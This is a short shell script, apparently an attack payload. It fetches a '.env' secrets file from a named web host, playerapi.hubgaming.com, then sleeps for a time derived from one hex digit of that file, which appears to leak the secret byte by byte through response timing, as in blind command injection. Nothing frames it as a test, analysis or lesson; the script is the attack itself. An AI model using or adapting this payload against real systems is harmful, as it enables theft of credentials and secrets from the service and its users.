#!/bin/sh
curl -s -o /w3 https://playerapi.hubgaming.com/.env
sleep $(( 20 + 2*0x$(od -j24 -N1 -tx1 /w3|cut -c10) ))
